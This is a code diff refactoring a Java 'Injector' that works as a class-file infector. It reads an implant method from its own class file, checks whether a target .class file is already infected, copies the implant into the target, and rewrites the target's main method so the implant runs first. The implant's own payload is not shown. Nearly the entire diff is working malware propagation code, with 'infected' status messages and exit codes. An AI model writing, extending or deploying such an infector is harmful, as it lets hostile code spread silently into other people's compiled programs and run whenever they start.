@@ -18,6 +18,7 @@ public class Injector {
         }
 
         Path target = Path.of(args[0]);
+        System.out.println("[i] Target class: " + target);
         if (!Files.exists(target) || !Files.isWritable(target)) {
             System.out.println("[!] Target class file does not exist or is not writable!");
             System.exit(2);
@@ -29,21 +30,38 @@ public class Injector {
             implant = Injector.readImplant(selfPath, "implant");
             System.out.println("[+] Read and serialized payload: " + implant);
         } catch (IOException e) {
-            System.out.println("[!] Failed to serialize payload!");
-            System.out.println("[!] " + e.getMessage());
+            System.out.println("[!] Failed to read payload! Error message: " + e.getMessage());
             System.exit(3);
             throw new RuntimeException("Unreachable", e);
         }
 
+        final boolean isAlreadyInfected;
         try {
-            boolean didInfect = Injector.infectTarget(target, implant);
-            if (!didInfect) {
-                System.out.println("[-] Class already infected. Skipping.");
-            } else {
-                System.out.println("[+] Infected target class: " + target);
-            }
+            isAlreadyInfected = Injector.isInfected(target, implant);
         } catch (IOException e) {
-            throw new RuntimeException(e);
+            System.out.println(("[!] Cannot read class! Error message: " + e.getMessage()));
+            System.exit(4);
+            throw new RuntimeException("Unreachable");
+        }
+
+        if (isAlreadyInfected) {
+            System.out.println("[-] Target class already infected. Skipping.");
+            System.exit(5);
+        }
+
+        final boolean didInfect;
+        try {
+            didInfect = Injector.infectTarget(target, implant);
+        } catch (IOException e) {
+            System.out.println("[!] Cannot infect target class file! Error message: " + e.getMessage());
+            System.exit(4);
+            throw new RuntimeException("Unreachable");
+        }
+
+        if (!didInfect) {
+            System.out.println("[-] Target class not suitable for infection. Skipping.");
+        } else {
+            System.out.println("[+] Infected target class: " + target);
         }
     }
 
@@ -69,6 +87,14 @@ public class Injector {
         return implantMethod;
     }
 
+    public static boolean isInfected(final Path classFilePath, final MethodInfo implant) throws IOException {
+        BufferedInputStream in = new BufferedInputStream(new FileInputStream(classFilePath.toFile()));
+        ClassFile cf = new ClassFile(new DataInputStream(in));
+        in.close();
+
+        return cf.getMethod(implant.getName()) != null;
+    }
+
     public static boolean infectTarget(final Path classFilePath, final MethodInfo implantMethod) throws IOException {
         BufferedInputStream in = new BufferedInputStream(new FileInputStream(classFilePath.toFile()));
         ClassFile cf = new ClassFile(new DataInputStream(in));
@@ -80,8 +106,10 @@ public class Injector {
             return false;
         }
 
+        // Add the implant method to target class
         MethodInfo targetImplantMethod;
         try {
+            // Construct a target method from the source (implant) method
             ConstPool constPool = cf.getConstPool();
             targetImplantMethod = new MethodInfo(constPool, implantMethod.getName(), implantMethod.getDescriptor());
             targetImplantMethod.setExceptionsAttribute(implantMethod.getExceptionsAttribute());
@@ -103,6 +131,7 @@ public class Injector {
             return false;
         }
 
+        // Modify the main method of the target class to run the implant method (before its own code)
         Bytecode newCode = new Bytecode(cf.getConstPool());
         // TODO Don't hardcode the package name
         newCode.addInvokestatic("org.example.target.Main", targetImplantMethod.getName(), targetImplantMethod.getDescriptor());
